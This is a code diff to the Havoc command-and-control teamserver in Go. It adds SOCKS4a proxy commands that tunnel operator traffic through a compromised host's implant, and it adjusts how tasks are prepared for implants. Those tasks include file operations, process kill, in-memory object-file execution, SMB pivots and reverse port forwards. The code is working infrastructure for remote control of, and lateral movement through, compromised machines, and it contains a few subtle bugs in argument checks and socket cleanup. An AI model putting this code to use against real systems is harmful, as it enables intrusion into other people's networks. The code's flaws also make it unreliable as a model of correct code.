@@ -5,6 +5,7 @@ import (
 	"Havoc/pkg/common/parser"
 	"Havoc/pkg/logger"
 	"Havoc/pkg/logr"
+	"Havoc/pkg/socks"
 	"Havoc/pkg/utils"
 	"Havoc/pkg/win32"
 	"bytes"
@@ -13,7 +14,9 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io"
 	"math/rand"
+	"net"
 	"strconv"
 	"strings"
 	"time"
@@ -85,9 +88,9 @@ func (a *Agent) TeamserverTaskPrepare(Command string, Console func(AgentID strin
 	return nil
 }
 
-func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
+func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (*Job, error) {
 	var (
-		job = Job{
+		job = &Job{
 			Command: uint32(Command),
 			Data:    []interface{}{},
 			Created: time.Now().UTC().Format("02/01/2006 15:04:05"),
@@ -122,7 +125,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 				Exit,
 			}
 		} else {
-			return Job{}, errors.New("ExitMethod not found")
+			return nil, errors.New("ExitMethod not found")
 		}
 
 		break
@@ -140,7 +143,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 
 			Delay, err = strconv.Atoi(val.(string))
 			if err != nil {
-				return Job{}, err
+				return nil, err
 			}
 
 			job.Data = []interface{}{
@@ -148,7 +151,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			}
 
 		} else {
-			return Job{}, fmt.Errorf("no sleep delay specified: \"Arguments\" is not specified")
+			return nil, fmt.Errorf("no sleep delay specified: \"Arguments\" is not specified")
 		}
 
 	case COMMAND_FS:
@@ -189,7 +192,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			if val, err := base64.StdEncoding.DecodeString(ArgArray[0]); err == nil {
 				FileName = []byte(common.EncodeUTF16(string(val)))
 			} else {
-				return Job{}, err
+				return nil, err
 			}
 
 			job.Data = []interface{}{
@@ -210,13 +213,13 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			if val, err := base64.StdEncoding.DecodeString(ArgArray[0]); err == nil {
 				FileName = append([]byte(common.EncodeUTF16(string(val))), []byte{0, 0}...)
 			} else {
-				return Job{}, err
+				return nil, err
 			}
 
 			if val, err := base64.StdEncoding.DecodeString(ArgArray[1]); err == nil {
 				Content = val
 			} else {
-				return Job{}, err
+				return nil, err
 			}
 
 			SubCommand = 3
@@ -264,13 +267,13 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 				if val, err := base64.StdEncoding.DecodeString(Paths[0]); err == nil {
 					PathFrom = []byte(common.EncodeUTF16(string(val)))
 				} else {
-					return Job{}, err
+					return nil, err
 				}
 
 				if val, err := base64.StdEncoding.DecodeString(Paths[1]); err == nil {
 					PathTo = []byte(common.EncodeUTF16(string(val)))
 				} else {
-					return Job{}, err
+					return nil, err
 				}
 
 				job.Data = []interface{}{
@@ -302,7 +305,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			if val, err := base64.StdEncoding.DecodeString(ArgArray[0]); err == nil {
 				FileName = []byte(common.EncodeUTF16(string(val)))
 			} else {
-				return Job{}, err
+				return nil, err
 			}
 
 			job.Data = []interface{}{
@@ -448,7 +451,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			var pid, err = strconv.Atoi(Arguments)
 			if err != nil {
 				logger.Debug("proc::kill failed to parse pid: " + err.Error())
-				return Job{}, errors.New("proc::kill failed to parse pid: " + err.Error())
+				return nil, errors.New("proc::kill failed to parse pid: " + err.Error())
 			} else {
 				job.Data = []interface{}{
 					SubCommand,
@@ -501,21 +504,21 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 
 		if Arguments, ok := Optional["Arguments"].(string); ok {
 			if Parameters, err = base64.StdEncoding.DecodeString(Arguments); !ok {
-				return Job{}, errors.New("FunctionName not defined")
+				return nil, errors.New("FunctionName not defined")
 			}
 		} else {
-			return Job{}, errors.New("CoffeeLdr: Arguments not defined")
+			return nil, errors.New("CoffeeLdr: Arguments not defined")
 		}
 
 		if Binary, ok := Optional["Binary"].(string); ok {
 			if ObjectFile, err = base64.StdEncoding.DecodeString(Binary); err != nil {
 				logger.Debug("Failed to turn base64 encoded object file into bytes: " + err.Error())
-				return Job{}, err
+				return nil, err
 			}
 		}
 
 		if FunctionName, ok = Optional["FunctionName"].(string); !ok {
-			return Job{}, errors.New("CoffeeLdr: FunctionName not defined")
+			return nil, errors.New("CoffeeLdr: FunctionName not defined")
 		}
 
 		if ObjectFlags, ok := Optional["Flags"].(string); ok {
@@ -538,7 +541,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			}
 
 		} else {
-			return Job{}, errors.New("CoffeeLdr: Flags not defined")
+			return nil, errors.New("CoffeeLdr: Flags not defined")
 		}
 
 		job.Data = []interface{}{
@@ -1112,16 +1115,16 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			NetCommand, err = strconv.Atoi(val.(string))
 			if err != nil {
 				logger.Debug("Failed to parse net command: " + err.Error())
-				return Job{}, err
+				return nil, err
 			}
 		} else {
-			return Job{}, errors.New("command::net NetCommand not defined")
+			return nil, errors.New("command::net NetCommand not defined")
 		}
 
 		if val, ok := Optional["Param"]; ok {
 			Param = val.(string)
 		} else {
-			return Job{}, errors.New("command::net param not defined")
+			return nil, errors.New("command::net param not defined")
 		}
 
 		switch NetCommand {
@@ -1214,7 +1217,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 
 			if val, err := strconv.Atoi(val.(string)); err != nil {
 				logger.Debug("failed to convert pivot command to int: " + err.Error())
-				return Job{}, errors.New("failed to convert pivot command to int: " + err.Error())
+				return nil, errors.New("failed to convert pivot command to int: " + err.Error())
 			} else {
 				PivotCommand = val
 			}
@@ -1238,7 +1241,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 		case DEMON_PIVOT_SMB_DISCONNECT:
 			var AgentID, err = strconv.ParseInt(Param, 16, 32)
 			if err != nil {
-				return Job{}, err
+				return nil, err
 			}
 
 			job.Data = []interface{}{
@@ -1285,7 +1288,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 		case "stop":
 			FileID, err = strconv.ParseInt(Param, 16, 32)
 			if err != nil {
-				return Job{}, err
+				return nil, err
 			}
 
 			job.Data = []interface{}{
@@ -1297,7 +1300,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 		case "resume":
 			FileID, err = strconv.ParseInt(Param, 16, 32)
 			if err != nil {
-				return Job{}, err
+				return nil, err
 			}
 
 			job.Data = []interface{}{
@@ -1309,7 +1312,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 		case "remove":
 			FileID, err = strconv.ParseInt(Param, 16, 32)
 			if err != nil {
-				return Job{}, err
+				return nil, err
 			}
 
 			job.Data = []interface{}{
@@ -1352,29 +1355,29 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			/* LclAddr; LclPort; FwdAddr; FwdPort */
 			Params = strings.Split(Param, ";")
 			if len(Param) < 4 {
-				return Job{}, fmt.Errorf("rportfwd requieres 4 arguments, received %d", len(Params))
+				return nil, fmt.Errorf("rportfwd requieres 4 arguments, received %d", len(Params))
 			}
 
 			/* Parse local host & port arguments */
 			LclAddr, err = common.IpStringToInt32(Params[0])
 			if err != nil {
-				return Job{}, err
+				return nil, err
 			}
 
 			LclPort, err = strconv.Atoi(Params[1])
 			if err != nil {
-				return Job{}, err
+				return nil, err
 			}
 
 			/* Parse forward host & port arguments */
 			FwdAddr, err = common.IpStringToInt32(Params[2])
 			if err != nil {
-				return Job{}, err
+				return nil, err
 			}
 
 			FwdPort, err = strconv.Atoi(Params[3])
 			if err != nil {
-				return Job{}, err
+				return nil, err
 			}
 
 			job.Data = []interface{}{
@@ -1399,7 +1402,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 
 			SocketID, err = strconv.Atoi(Param)
 			if err != nil {
-				return Job{}, err
+				return nil, err
 			}
 
 			job.Data = []interface{}{
@@ -1413,6 +1416,290 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 				SOCKET_COMMAND_RPORTFWD_CLEAR,
 			}
 			break
+
+		case "socks add":
+
+			var Socks *socks.Socks
+
+			Socks = socks.NewSocks("0.0.0.0:" + Param)
+			if Socks == nil {
+				return nil, errors.New("failed to create a new socks4a instance")
+			}
+
+			Socks.SetHandler(func(s *socks.Socks, conn net.Conn) {
+
+				var (
+					ConnectJob  Job
+					SocksHeader socks.SocksHeader
+					err         error
+					SocketId    int32
+				)
+
+				SocksHeader, err = socks.ReadSocksHeader(conn)
+				if err != nil {
+					if err != io.EOF {
+						logger.Error("Failed to read socks header: " + err.Error())
+						return
+					}
+				}
+
+				/* generate some random socket id */
+				SocketId = rand.Int31n(0x10000)
+
+				s.Clients = append(s.Clients, SocketId)
+
+				a.SocksClientAdd(SocketId, conn)
+
+				/* now parse the host:port and send it to the agent. */
+				ConnectJob = Job{
+					Command: COMMAND_SOCKET,
+					Data: []any{
+						SOCKET_COMMAND_CONNECT,
+						SocketId,
+						SocksHeader.Port,
+						SocksHeader.IP,
+						SocksHeader.Domain,
+					},
+				}
+
+				a.AddJobToQueue(ConnectJob)
+
+				/* goroutine to read from socks proxy socket and send it to the agent */
+				go func(SocketId int) {
+
+					for {
+
+						/* check if the connection is still up */
+						if client := a.SocksClientGet(SocketId); client != nil {
+
+							if !client.Connected {
+								/* if we are still not connected then skip */
+								continue
+							}
+
+							if Data, err := a.SocksClientRead(SocketId); err == nil {
+
+								/* only send the data if there is something... */
+								if len(Data) > 0 {
+
+									/* make a new job */
+									var job = Job{
+										Command: COMMAND_SOCKET,
+										Data: []any{
+											SOCKET_COMMAND_READ_WRITE,
+											client.SocketID,
+											Data,
+										},
+									}
+
+									/* append the job to the task queue */
+									a.AddJobToQueue(job)
+
+								}
+
+							} else {
+
+								if err != io.EOF {
+
+									/* we failed to read from the socks proxy */
+									logger.Error(fmt.Sprintf("Failed to read from socket %x: %v", client.SocketID, err))
+
+									a.SocksClientClose(SocketId)
+
+									/* make a new job */
+									var job = Job{
+										Command: COMMAND_SOCKET,
+										Data: []any{
+											SOCKET_COMMAND_CLOSE,
+											client.SocketID,
+										},
+									}
+
+									/* append the job to the task queue */
+									a.AddJobToQueue(job)
+
+								}
+
+								break
+							}
+
+						} else {
+							/* seems like it has been removed. let's exit this routine */
+
+							break
+						}
+
+					}
+
+				}(int(SocketId))
+
+			})
+
+			/* TODO: append the socket to a list/array now */
+			a.SocksSvr = append(a.SocksSvr, &SocksServer{
+				Server: Socks,
+				Addr:   Param,
+			})
+
+			go func() {
+				err := Socks.Start()
+				if err != nil {
+					Socks.Failed = true
+					if Message != nil {
+						*Message = map[string]string{
+							"Type":    "Error",
+							"Message": fmt.Sprintf("Failed to start socks proxy: %v", err),
+							"Output":  "",
+						}
+					}
+					return
+				}
+			}()
+
+			if Message != nil {
+				if !Socks.Failed {
+
+					*Message = map[string]string{
+						"Type":    "Good",
+						"Message": fmt.Sprintf("Started socks4a server on port %v", Param),
+						"Output":  "",
+					}
+				}
+			}
+
+			return nil, nil
+
+		case "socks list":
+
+			var Output string
+
+			Output += fmt.Sprintf("\n")
+			Output += fmt.Sprintf(" Port \n")
+			Output += fmt.Sprintf(" ---- \n")
+
+			for _, server := range a.SocksSvr {
+
+				Output += fmt.Sprintf(" %s \n", server.Addr)
+
+			}
+
+			if Message != nil {
+				*Message = map[string]string{
+					"Type":    "Info",
+					"Message": "Socks proxy server: ",
+					"Output":  Output,
+				}
+			}
+
+			return nil, nil
+
+		case "socks kill":
+
+			/* TODO: send a queue of tasks to kill every socks proxy client that uses this proxy */
+			var found = false
+
+			for i := range a.SocksSvr {
+
+				if a.SocksSvr[i].Addr == Param {
+
+					/* alright we found it */
+					found = true
+
+					/* close the server */
+					a.SocksSvr[i].Server.Close()
+
+					/* close every connection that the agent has with this socks proxy */
+					for client := range a.SocksSvr[i].Server.Clients {
+
+						/* close the client connection */
+						a.SocksClientClose(client)
+
+						/* make a new job */
+						var job = Job{
+							Command: COMMAND_SOCKET,
+							Data: []any{
+								SOCKET_COMMAND_CLOSE,
+								client,
+							},
+						}
+
+						/* append the job to the task queue */
+						a.AddJobToQueue(job)
+
+					}
+
+					/* remove the socks server from the array */
+					a.SocksSvr = append(a.SocksSvr[:i], a.SocksSvr[i+1:]...)
+
+					break
+				}
+
+			}
+
+			if found {
+
+				if Message != nil {
+					*Message = map[string]string{
+						"Type":    "Info",
+						"Message": "Closed socks proxy " + Param,
+					}
+				}
+
+			} else {
+
+				if Message != nil {
+					*Message = map[string]string{
+						"Type":    "Info",
+						"Message": "Failed to find and close socks proxy " + Param,
+					}
+				}
+
+			}
+
+			return nil, nil
+
+		case "socks clear":
+
+			/* TODO: send a queue of tasks to kill every socks proxy client that uses this proxy */
+
+			for i := range a.SocksSvr {
+
+				/* close the server */
+				a.SocksSvr[i].Server.Close()
+
+				/* close every connection that the agent has with this socks proxy */
+				for client := range a.SocksSvr[i].Server.Clients {
+
+					/* close the client connection */
+					a.SocksClientClose(client)
+
+					/* make a new job */
+					var job = Job{
+						Command: COMMAND_SOCKET,
+						Data: []any{
+							SOCKET_COMMAND_CLOSE,
+							client,
+						},
+					}
+
+					/* append the job to the task queue */
+					a.AddJobToQueue(job)
+
+				}
+
+				/* remove the socks server from the array */
+				a.SocksSvr = append(a.SocksSvr[:i], a.SocksSvr[i+1:]...)
+
+			}
+
+			if Message != nil {
+				*Message = map[string]string{
+					"Type":    "Info",
+					"Message": "Successfully closed all socks proxies " + Param,
+				}
+			}
+
+			return nil, nil
 		}
 
 		break
@@ -3993,28 +4280,54 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 
 			case SOCKET_COMMAND_READ_WRITE:
 				/* if we receive the SOCKET_COMMAND_READ_WRITE command
-				 * that means that we should read the callback and send it to the forwared host */
+				 * that means that we should read the callback and send it to the forwared host/socks proxy */
 
 				if Parser.Length() >= 8 {
 					var (
-						Id     = Parser.ParseInt32()
-						Data   = Parser.ParseBytes()
-						Socket *PortFwd
+						Id   = Parser.ParseInt32()
+						Type = Parser.ParseInt32()
+						Data = Parser.ParseBytes()
 					)
 
-					/* check if there is a socket with that portfwd id */
-					if Socket = a.PortFwdGet(Id); Socket != nil {
+					if Type == SOCKET_TYPE_CLIENT {
 
-						/* write the data to the forwarded host */
-						err := a.PortFwdWrite(Id, Data)
-						if err != nil {
-							a.Console(Funcs.DemonOutput, "Erro", fmt.Sprintf("Failed to write to reverse port forward host %s: %v", Socket.Target, err), "")
-							return
+						/* check if there is a socket with that portfwd id */
+						if Socket := a.PortFwdGet(Id); Socket != nil {
+
+							/* write the data to the forwarded host */
+							err := a.PortFwdWrite(Id, Data)
+							if err != nil {
+								a.Console(Funcs.DemonOutput, "Erro", fmt.Sprintf("Failed to write to reverse port forward host %s: %v", Socket.Target, err), "")
+								return
+							}
+
+						} else {
+
+							logger.Error(fmt.Sprintf("Socket id not found: %x\n", Id))
+
 						}
 
-					} else {
+					} else if Type == SOCKET_TYPE_REVERSE_PROXY {
 
-						logger.Error(fmt.Sprintf("Socket id not found: %x\n", Id))
+						/* check if there is a socket with that socks proxy id */
+						if Socket := a.SocksClientGet(Id); Socket != nil {
+
+							/* write the data to socks proxy */
+							_, err := Socket.Conn.Write(Data)
+							if err != nil {
+								a.Console(Funcs.DemonOutput, "Erro", fmt.Sprintf("Failed to write to socks proxy %v: %v", Id, err), "")
+
+								/* TODO: remove socks proxy client */
+								a.SocksClientClose(SOCKET_TYPE_CLIENT)
+
+								return
+							}
+
+						} else {
+
+							logger.Error(fmt.Sprintf("Socket id not found: %x\n", Id))
+
+						}
 
 					}
 
@@ -4031,19 +4344,67 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 						Socket *PortFwd
 					)
 
-					/* check if there is a socket with that portfwd id */
-					if Socket = a.PortFwdGet(SockId); Socket != nil {
+					/* NOTE: for now the reverse port forward close command is not used. */
+					if Type == SOCKET_TYPE_REVERSE_PORTFWD || Type == SOCKET_TYPE_CLIENT {
 
-						/* Based on the type of the socket tell the operator
-						 * for example SOCKET_TYPE_CLIENT is something we can ignore.
-						 * But if it's a SOCKET_TYPE_REVERSE_PORTFWD then let the operator know. */
-						if Type == SOCKET_TYPE_REVERSE_PORTFWD {
-							var LclString = common.Int32ToIpString(int64(Socket.LclAddr))
-							a.Console(Funcs.DemonOutput, "Info", fmt.Sprintf("Closed reverse port forward [Id: %x] [Bind %s:%d] [Forward: %s]", Socket.SocktID, LclString, Socket.LclPort, Socket.Target), "")
+						/* check if there is a socket with that portfwd id */
+						if Socket = a.PortFwdGet(SockId); Socket != nil {
+
+							/* Based on the type of the socket tell the operator
+							 * for example SOCKET_TYPE_CLIENT is something we can ignore.
+							 * But if it's a SOCKET_TYPE_REVERSE_PORTFWD then let the operator know. */
+							if Type == SOCKET_TYPE_REVERSE_PORTFWD {
+								var LclString = common.Int32ToIpString(int64(Socket.LclAddr))
+								a.Console(Funcs.DemonOutput, "Info", fmt.Sprintf("Closed reverse port forward [Id: %x] [Bind %s:%d] [Forward: %s]", Socket.SocktID, LclString, Socket.LclPort, Socket.Target), "")
+							}
+
+							/* finally close our port forwarder */
+							a.PortFwdClose(SockId)
 						}
 
-						/* finally close our port forwarder */
-						a.PortFwdClose(SockId)
+					} else if Type == SOCKET_TYPE_REVERSE_PROXY {
+
+						if Client := a.SocksClientGet(SockId); Client != nil {
+
+							/* lets remove it */
+							a.SocksClientClose(SockId)
+
+						}
+
+					}
+				}
+
+				break
+
+			case SOCKET_COMMAND_CONNECT:
+
+				if Parser.Length() >= 4 {
+
+					var (
+						Success  = Parser.ParseInt32()
+						SocketId = Parser.ParseInt32()
+					)
+
+					if Client := a.SocksClientGet(SocketId); Client != nil {
+
+						if Success == win32.TRUE {
+
+							_, err := Client.Conn.Write([]byte{0x00, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
+							if err != nil {
+								return
+							}
+							Client.Connected = true
+
+						} else {
+
+							a.SocksClientClose(SocketId)
+
+						}
+
+					} else {
+
+						logger.Error(fmt.Sprintf("Socket id not found: %x\n", SocketId))
+
 					}
 
 				}
